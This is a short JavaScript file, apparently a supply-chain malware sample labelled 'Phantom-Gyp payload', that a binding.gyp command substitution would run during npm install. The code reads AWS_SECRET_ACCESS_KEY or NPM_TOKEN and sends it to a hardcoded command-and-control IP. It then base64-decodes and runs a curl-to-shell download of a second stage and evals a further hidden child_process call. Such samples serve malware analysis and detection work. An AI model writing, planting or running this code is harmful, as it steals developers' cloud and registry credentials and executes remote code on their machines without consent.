// Phantom-Gyp payload: this file is NOT referenced by any package.json lifecycle script.
// It runs purely because binding.gyp does `<!(node loader.js)` — node-gyp executes the
// command-substitution at configure time on `npm install`. Exfiltrates credentials to a
// hardcoded C2 IP and pulls + executes a remote second stage.
const https = require('https');
const cp = require('child_process');

const secret = process.env.AWS_SECRET_ACCESS_KEY || process.env.NPM_TOKEN || '';
https.get('https://185.220.101.45/c2?d=' + Buffer.from(secret).toString('base64'));

// base64-decoded remote fetch piped to shell, then eval of a decoded second stage.
cp.execSync(Buffer.from('Y3VybCBodHRwOi8vMTg1LjIyMC4xMDEuNDUvcyB8IHNo', 'base64').toString());
eval(Buffer.from('cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2lkJyk=', 'base64').toString());
